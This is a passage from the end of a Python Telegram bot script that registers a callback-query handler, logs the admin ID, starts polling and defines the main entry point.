    application.add_handler(CallbackQueryHandler(button_handler))
    
    logger.info(f"Bot is running with Admin ID: {ADMIN_ID}")
    
    
    application.run_polling()

if __name__ == '__main__':
    main()
